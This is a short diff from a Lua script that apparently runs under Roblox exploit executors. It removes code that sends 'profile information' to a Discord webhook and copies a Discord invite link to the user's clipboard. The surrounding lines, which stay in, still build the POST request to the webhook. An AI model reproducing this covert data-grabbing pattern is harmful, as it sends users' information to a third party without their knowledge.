@@ -453,15 +453,6 @@ request = http_request or request or HttpPost or fluxus.request or syn.request o
 local request = http_request or request or HttpPost or syn.request
 local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers}
 
-local success, response = pcall(request, final)
-if success then
-    print("Profile information sent to Discord.")
-else
-    print("Failed to send profile information to Discord: " .. response)
-end
-
-setclipboard("https://discord.gg/wEUppgfJ")
-
 local old_tts = tostring;
 local a, b = {
 	{
